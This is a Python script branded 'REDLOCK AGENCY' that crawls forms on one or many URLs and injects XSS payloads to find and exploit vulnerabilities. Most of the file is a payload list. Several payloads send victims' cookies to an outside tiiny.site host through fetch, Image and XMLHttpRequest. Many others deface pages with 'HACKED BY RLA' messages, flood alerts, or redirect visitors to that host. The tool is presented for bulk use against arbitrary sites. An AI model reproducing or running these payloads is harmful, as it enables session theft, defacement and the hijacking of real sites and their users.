import os
from threading import Lock
import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from tqdm import tqdm
import multiprocessing
import sys
import platform
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
from termcolor import colored


print(f"{Fore.RED}-{Fore.RESET}" * 75 + "\n")
print(f""" {Fore.MAGENTA}[{Fore.RED}:{Fore.GREEN}ｃ０ｍ３ｔ５ｃ４ｎ{Fore.MAGENTA}]    {Fore.RESET}≋c≋0≋m≋3≋t≋5≋c≋4≋n≋   {Fore.MAGENTA} [{Fore.RED}:{Fore.GREEN}ｃ０ｍ３ｔ５ｃ４ｎ{Fore.MAGENTA}]{Fore.RESET}
    {Fore.RESET}HUNT FOR {Fore.BLUE}XSS, REDIRECT & DEFACE VULNS {Fore.RESET}ON A URL OR URLS IN A FILE {Fore.MAGENTA}...{Fore.RESET}
  {Fore.MAGENTA}[ {Fore.GREEN}ᑕ0ᗰ3T5ᑕ4ᑎ {Fore.MAGENTA}] {Fore.RESET}WILL TRY TO EXPLOIT THE VULNS IT FINDS{Fore.MAGENTA}...{Fore.RESET}
      {Fore.MAGENTA}---  {Fore.RED}USE AT YOUR OWN RISK{Fore.MAGENTA}!{Fore.RESET} REDLOCK AGENCY""")
print(f"{Fore.RED}-{Fore.RESET}" * 75 + "\n")


# Global lock for file writes
vuln_file_lock = Lock()

# Helper Functions

def add_scheme_if_needed(url):
    """Ensures the URL has a valid scheme (http/https)."""
    if not url.startswith(("http://", "https://")):
        return "https://" + url
    return url

def get_forms(url):
    """Extract all forms from a given URL."""
    try:
        soup = bs(requests.get(url, timeout=5).content, "html.parser")
        return soup.find_all("form")
    except requests.RequestException:
        return []

def get_details(form):
    """Extracts details (method, action, inputs) from a form."""
    return {
        "action": form.attrs.get("action", "").lower(),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": [{"type": input_tag.attrs.get("type", "text"),
                    "name": input_tag.attrs.get("name")} 
                   for input_tag in form.find_all("input")]
    }

def submit_form(session, form_details, url, value):
    """Submits a form with a payload for testing vulnerabilities."""
    target_url = urljoin(url, form_details["action"])
    data = {input_tag["name"]: value for input_tag in form_details["inputs"] if input_tag["name"]}
    try:
        response = (session.post(target_url, data=data, timeout=5)
                    if form_details["method"] == "post"
                    else session.get(target_url, params=data, timeout=5))
        response.encoding = response.apparent_encoding  # Fix encoding issues
        return response
    except requests.RequestException:
        return None

def is_xss_vulnerable(response, payload):
    """Checks if an XSS payload appears in the response."""
    try:
        return payload in response.text
    except UnicodeDecodeError:
        return False  # Handle encoding errors

def save_vulnerability(url, payload, form_details, payload_type, threat_level):
    """Saves vulnerability details to XSS/vulns.txt."""
    folder = "XSS"
    if not os.path.exists(folder):
        os.makedirs(folder)
    file_path = os.path.join(folder, "vulns.txt")
    with vuln_file_lock:
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(f"URL: {url}\n")
            f.write(f"Payload: {payload}\n")
            f.write(f"Payload Type: {payload_type}\n")
            f.write(f"Threat Level: {threat_level}\n")
            f.write(f"Action URL: {urljoin(url, form_details['action'])}\n")
            f.write(f"Exploitable Input: {form_details['inputs']}\n")
            f.write("-" * 75 + "\n")

def save_exploit_url(exploit_url):
    """Saves the exploited action URL to XSS/exploit-url.txt."""
    folder = "XSS"
    if not os.path.exists(folder):
        os.makedirs(folder)
    file_path = os.path.join(folder, "exploit-url.txt")
    with vuln_file_lock:
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(f"{exploit_url}\n")

# Scan Functions

def explain_vulnerability(payload_type):
    """Provide brief information on each XSS vulnerability."""
    vulnerabilities = {
        "reflected": "Reflected XSS: Attackers inject malicious JavaScript via user inputs (e.g., URL or form) which is reflected in the response and executed.",
        "stored": "Stored XSS: Malicious script is stored on the server (e.g., in a database) and executed when other users view the page.",
        "dom_based": "DOM-Based XSS: Client-side JavaScript modifies the DOM without proper sanitization, executing malicious payloads.",
        "image_based": "Image-Based XSS: Malicious payload in an `<img>` tag using `onerror` triggers execution when the image fails to load.",
        "javascript_redirection": "JavaScript Redirection XSS: Payload triggers redirection via `window.location` to a malicious site."
    }
    return vulnerabilities.get(payload_type, "No detailed information available.")

# Define more aggressive payloads for higher threat levels
low_threat_payloads = [
    ("<script>alert('XSS')</script>", "reflected"),
    ("<img src='x' onerror='alert(1)'>", "image_based")
]

medium_threat_payloads = [
    ("<svg/onload=alert(1)>", "reflected"),
    ("<body onload=alert(1)>", "reflected"),
    ("<iframe src='javascript:alert(1)'></iframe>", "reflected"),
    ("<a href='javascript:alert(1)'>Click me</a>", "reflected")
]

high_threat_payloads = [
    # Stored XSS
    ("<input type='text' value=''><script>alert(document.cookie)</script>", "stored"),
    ("<script>new Image().src='https://turquoise-jackquelin-59.tiiny.site?c='+document.cookie;</script>", "stored"),
    ("<script>fetch('https://turquoise-jackquelin-59.tiiny.site?c='+document.cookie)</script>", "stored"),
    ("<script>XMLHttpRequest.open('GET', 'https://turquoise-jackquelin-59.tiiny.site?c='+document.cookie, true);</script>", "stored"),
    ("<?php echo \"<script>alert(document.cookie)</script>\"; ?>", "stored"),
    ("<?php echo \"<script>console.log('Stored XSS: ' + document.cookie);</script>\"; ?>", "stored"),
    ("<?php echo \"<script>document.body.innerHTML = '<img src=x onerror=alert(1)>';</script>\"; ?>", "stored"),
    ("<?php echo \"<script>document.body.innerHTML = '<iframe src=\"https://turquoise-jackquelin-59.tiiny.site\"></iframe>';</script>\"; ?>", "stored"),
    ("<?php echo \"<script>document.cookie = 'XSS=alert(1)';</script>\"; ?>", "stored"),
    
    # Reflected XSS
    ("<script>eval('alert(1)');</script>", "reflected"),
    ("<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>", "reflected"),
    ("<script>setTimeout('alert(1)', 1000);</script>", "reflected"),
    ("<script>document.body.innerHTML = '<script>alert(1)</script>';</script>", "reflected"),
    ("<script>document.body.innerHTML = '<img src=x onerror=alert(1)>';</script>", "reflected"),
    
    # JavaScript Redirection
    ("<script>document.location='javascript:alert(1)';</script>", "javascript_redirection"),
    ("<script>window.open('https://turquoise-jackquelin-59.tiiny.site')</script>", "javascript_redirection"),
    ("<script>window.location='https://turquoise-jackquelin-59.tiiny.site'</script>", "javascript_redirection"),
    ("<meta http-equiv='refresh' content='0;url=https://turquoise-jackquelin-59.tiiny.site/'>", "javascript_redirection"),
    ("<iframe src='https://turquoise-jackquelin-59.tiiny.site/'></iframe>", "javascript_redirection"),
    ("<script>history.pushState('', '', 'https://turquoise-jackquelin-59.tiiny.site/')</script>", "javascript_redirection"),
    
    # PHP Redirection (added)
    ("<?php echo \"<script>window.location='https://turquoise-jackquelin-59.tiiny.site/';</script>\"; ?>", "php_redirection"),
    ("<?php echo \"<meta http-equiv='refresh' content='0;url=https://turquoise-jackquelin-59.tiiny.site/'>\"; ?>", "php_redirection"),
    
    # More Redirect XSS
    ("<script>window.location.href='https://turquoise-jackquelin-59.tiiny.site/';</script>", "javascript_redirection"),
    ("<script>setTimeout(() => { window.location = 'https://turquoise-jackquelin-59.tiiny.site/'; }, 2000);</script>", "javascript_redirection"),
    ("<meta http-equiv='refresh' content='0;url=https://turquoise-jackquelin-59.tiiny.site/'>", "javascript_redirection"),
    ("<script>window.location.replace('https://turquoise-jackquelin-59.tiiny.site/');</script>", "javascript_redirection"),
    ("<script>document.location = 'https://turquoise-jackquelin-59.tiiny.site/';</script>", "javascript_redirection"),

    # Additional Stored XSS
    ("<?php echo \"<script>alert('HACKED BY REDLOCK AGENCY');</script>\"; ?>", "stored"),
    ("<?php echo \"<script>document.body.innerHTML = '<h1>HACKED BY RLA</h1>';</script>\"; ?>", "stored"),
    ("<?php echo \"<script>document.body.innerHTML = '<iframe src=\"https://turquoise-jackquelin-59.tiiny.site/\"></iframe>';</script>\"; ?>", "stored"),
    ("<?php echo \"<script>document.body.innerHTML = '<div style=\"background:red;width:100%\">XSS</div>';</script>\"; ?>", "stored"),

    # Simple Deface with Text
    ("<script>document.body.innerHTML = '<h1 style=\"color:red;\">HACKED BY RLA</h1>';</script>", "deface_text_red"),
    ("<script>document.body.innerHTML = '<h1 style=\"color:blue;\">REDLOCK AGENCY - This site is under attack!</h1>';</script>", "deface_text_blue"),
    ("<script>document.body.innerHTML = '<h1 style=\"font-size:50px; color:green;\">HACKED BY RLA - Site Compromised</h1>';</script>", "deface_text_green"),
    
    # Deface with Image
    ("<script>document.body.innerHTML = '<img src=\"https://turquoise-jackquelin-59.tiiny.site/hacked_image.jpg\" style=\"width:100%; height:100%;\">';</script>", "deface_image"),
    ("<script>document.body.innerHTML = '<h1 style=\"color:red;\">REDLOCK AGENCY: Site has been defaced!</h1><img src=\"https://turquoise-jackquelin-59.tiiny.site/deface.jpg\" style=\"width:100%; height:100%;\">';</script>", "deface_image_redlock"),
    
    # Deface with Redirection
    ("<script>document.body.innerHTML = '<h1 style=\"color:purple;\">HACKED BY RLA - Redirection in 5 seconds!</h1>'; setTimeout(() => { window.location = 'https://turquoise-jackquelin-59.tiiny.site/?msg=HACKED+BY+RLA'; }, 5000);</script>", "deface_redirection"),
    ("<script>document.body.innerHTML = '<h1 style=\"color:orange;\">REDLOCK AGENCY: Site under attack. Redirecting...</h1>'; setTimeout(() => { window.location = 'https://turquoise-jackquelin-59.tiiny.site/?msg=REDLOCK+AGENCY'; }, 3000);</script>", "deface_redirection_lock"),
    
    # Chaotic Deface with Multiple Messages
    ("<script>document.body.innerHTML = '<h1 style=\"color:red;\">HACKED BY RLA</h1><h2>This site is under control!</h2><img src=\"https://turquoise-jackquelin-59.tiiny.site/deface_image.jpg\" style=\"width:100%; height:100%;\">';</script>", "deface_message_multiple"),
    ("<script>document.body.innerHTML = '<h1 style=\"color:green;\">REDLOCK AGENCY: You have been hacked!</h1><h2>Redirecting you shortly...</h2><img src=\"https://turquoise-jackquelin-59.tiiny.site/deface_image.jpg\" style=\"width:100%; height:100%;\">'; setTimeout(() => { window.location = 'https://turquoise-jackquelin-59.tiiny.site/?msg=REDLOCK+AGENCY'; }, 3000);</script>", "deface_multiple_redirect"),
    
    # Full Page Deface with Style
    ("<script>document.body.innerHTML = '<style>body { background-color: black; color: red; font-size: 50px; text-align: center; padding-top: 20%; }</style><h1>HACKED BY RLA - The site has been compromised!</h1>'; document.body.style.backgroundColor = 'black';</script>", "deface_full_page"),
    ("<script>document.body.innerHTML = '<style>body { background-color: black; color: blue; font-size: 50px; text-align: center; padding-top: 20%; }</style><h1>REDLOCK AGENCY: This site is compromised!</h1>'; document.body.style.backgroundColor = 'black';</script>", "deface_full_page_lock"),
    
    # Deface with Multiple Styles
    ("<script>document.body.innerHTML = '<style>body { background-color: red; color: white; font-size: 40px; text-align: center; }</style><h1>HACKED BY RLA - You are now under control!</h1>'; document.body.style.backgroundColor = 'red';</script>", "deface_style_change_red"),
    ("<script>document.body.innerHTML = '<style>body { background-color: purple; color: yellow; font-size: 40px; text-align: center; }</style><h1>REDLOCK AGENCY: Site hacked!</h1>'; document.body.style.backgroundColor = 'purple';</script>", "deface_style_change_purple"),
    
    # Deface with Overlays
    ("<script>document.body.innerHTML = '<div style=\"position:fixed; top:0; left:0; width:100%; height:100%; background-color:black; color:white; text-align:center; font-size:50px; padding-top:30%;\">HACKED BY RLA - Site Compromised!</div>'; document.body.style.backgroundColor = 'black';</script>", "deface_overlay"),
    ("<script>document.body.innerHTML = '<div style=\"position:fixed; top:0; left:0; width:100%; height:100%; background-color:red; color:white; text-align:center; font-size:50px; padding-top:30%;\">REDLOCK AGENCY: Hacked!</div>'; document.body.style.backgroundColor = 'red';</script>", "deface_overlay_red"),
    
    # Chaotic Deface with Alert Flood and Redirect
    ("<script>document.body.innerHTML = '<h1 style=\"color:yellow;\">HACKED BY RLA</h1>'; setInterval(() => { alert('HACKED BY RLA'); }, 500); window.location = 'https://turquoise-jackquelin-59.tiiny.site/?msg=HACKED+BY+RLA';</script>", "deface_alert_flood"),
    ("<script>document.body.innerHTML = '<h1 style=\"color:orange;\">REDLOCK AGENCY: This site has been compromised!</h1>'; setInterval(() => { alert('REDLOCK AGENCY: Site is under attack!'); }, 1000); window.location = 'https://turquoise-jackquelin-59.tiiny.site/?msg=REDLOCK+AGENCY';</script>", "deface_alert_redirect"),
    
    # Persistent Content Change and Redirect
    ("<script>document.body.innerHTML = '<h1>HACKED BY RLA - The site is compromised!</h1>'; setInterval(() => { document.body.innerHTML = '<h1>REDLOCK AGENCY: Site under control!</h1>'; }, 1000); setTimeout(() => { window.location = 'https://turquoise-jackquelin-59.tiiny.site/?msg=HACKED+BY+RLA'; }, 2000);</script>", "deface_persistent_redirect"),
    ("<script>document.body.innerHTML = '<h1>REDLOCK AGENCY: Site compromised!</h1>'; setInterval(() => { document.body.innerHTML = '<h1>HACKED BY RLA - Site under control!</h1>'; }, 1000); setTimeout(() => { window.location = 'https://turquoise-jackquelin-59.tiiny.site/?msg=REDLOCK+AGENCY'; }, 2000);</script>", "deface_persistent_spam"),
    
    # Deface with Element Removal
    ("<script>document.body.innerHTML = '<h1>HACKED BY RLA</h1>'; document.body.style.display = 'none'; setInterval(() => { document.body.innerHTML = '<h1>REDLOCK AGENCY - Site Compromised!</h1>'; }, 2000);</script>", "deface_element_removal"),
    ("<script>document.body.innerHTML = '<h1 style=\"color:red;\">REDLOCK AGENCY: Site is under attack!</h1>'; document.body.style.display = 'none'; setInterval(() => { document.body.innerHTML = '<h1 style=\"color:blue;\">HACKED BY RLA!</h1>'; }, 1000);</script>", "deface_hidden_message"),

]


def get_threat_level(payload_type):
    """Automatically assigns a threat level based on payload type."""
    if payload_type in ["stored", "javascript_redirection"]:
        return "High"
    elif payload_type in ["reflected", "dom_based"]:
        return "Medium"
    else:
        return "Low"

def scan_xss(session, url):
    """Tests a URL for XSS vulnerabilities with automatic threat level detection."""
    url = add_scheme_if_needed(url)
    # Automatically choose payloads based on the detected vulnerability type
    xss_payloads = low_threat_payloads + medium_threat_payloads + high_threat_payloads

    found_vulns = False
    form_counter = 1  # Form counter for each URL's form scanning
    payload_counter = 1  # Payload counter for each form's payload testing

    forms = get_forms(url)

    # Track and show progress for forms
    for form in forms:
        form_details = get_details(form)
        sys.stdout.write(colored(f"\r                                                | 🔍 [Scanning Form {form_counter}/{len(forms)}] - URL: {url}", 'yellow', attrs=['bold']))
        sys.stdout.flush()
        form_counter += 1

        # Track and show progress for payloads
        for payload, payload_type in xss_payloads:
            sys.stdout.write(colored(f"\r[+] Payloads tested on {payload_counter}/{len(xss_payloads)} web directories...", 'cyan'))
            sys.stdout.flush()
            res = submit_form(session, form_details, url, payload)
            full_url = urljoin(url, form_details["action"])  # Resolving to full URL

            # Display the exact URL (internal or external) where the vulnerability was found
            if res and is_xss_vulnerable(res, payload):
                found_vulns = True
                threat_level = get_threat_level(payload_type)
                print(colored(f"\n✅ [XSS Found] - Payload: {payload} | URL: {full_url}", 'green', attrs=['bold']))
                print(f"🔍 Exploitable Input: {form_details['inputs']}")
                print(colored(f"💡 Exploit Info: {explain_vulnerability(payload_type)}", 'blue', attrs=['bold']))
                print(colored(f"🔥 Threat Level: {threat_level}", 'red', attrs=['bold']))
                print("\n" + "-" * 75)
                save_vulnerability(url, payload, form_details, payload_type, threat_level)
                save_exploit_url(full_url)
                return
            payload_counter += 1  # Increment payload counter for each payload tested

    if found_vulns:
        print(colored(f"✅ [No Vulnerabilities Found] | URL: {url}", 'green'))
    return found_vulns

# Multi-Process Wrapper

def scan_url_wrapper(args):
    """Wrapper function for multiprocessing."""
    url, session = args
    return scan_xss(session, url)

# Bulk Scanning with Batch and ThreadPool

def scan_urls_from_file(file_path):
    """Scans multiple URLs from a file using multi-processing and thread pools."""
    try:
        with open(file_path, "r") as file:
            urls = [line.strip() for line in file if line.strip()]
        
        total_urls = len(urls)
        tested_urls = 0
        vulnerabilities_found = 0

        with multiprocessing.Pool(processes=multiprocessing.cpu_count()) as pool:
            with ThreadPoolExecutor(max_workers=5) as executor:  # You can adjust max_workers
                session = requests.Session()  # Reuse connections for performance
                futures = [executor.submit(scan_url_wrapper, (url, session)) for url in urls]

                for future in tqdm(futures, total=total_urls, 
                                   desc=colored("🔍 Scanning Progress", 'cyan'), 
                                   dynamic_ncols=True):
                    result = future.result()
                    tested_urls += 1
                    if result:
                        vulnerabilities_found += 1
        print(colored(f"\nTotal URLs Tested: {tested_urls}", 'yellow'))
        print(colored(f"Total Vulnerabilities Found: {vulnerabilities_found}", 'green'))
    except FileNotFoundError:
        print(colored(f"⚠️ Error: File {file_path} not found.", 'red'))

# Check if the user is on Arch Linux
def is_arch():
    return "arch" in platform.system().lower()

# Main Menu

def menu():
    """Displays the main menu."""
    print("\n" + "-" * 30 + " MENU " + "-" * 30)
    print("1. Check for XSS")
    print("2. Scan URLs from a file")
    print("3. Exit")

# Main Execution Loop

def main():
    """Main loop for user interaction."""
    if is_arch():
        print(colored("🚀 Welcome, Arch user! Ready to test vulnerabilities!", 'green', attrs=['bold']))
    else:
        print(colored("👋 Welcome! Let's test some vulnerabilities! 🌐", 'blue', attrs=['bold']))

    while True:
        menu()
        choice = input(colored("Enter your choice [1-3]: ", 'cyan')).strip()

        if choice == '1':
            url = input(colored("Enter URL for XSS scan: ", 'magenta')).strip()
            scan_xss(requests.Session(), url)

        elif choice == '2':
            file_path = input(colored("Enter the file path containing URLs: ", 'magenta')).strip()
            scan_urls_from_file(file_path)

        elif choice == '3':
            print(colored("👋 Exiting...", 'red', attrs=['bold']))
            sys.exit()

        else:
            print(colored("⚠️ Invalid choice. Please enter a number between 1 and 3.", 'red'))

# Run the Program
if __name__ == "__main__":
    main()
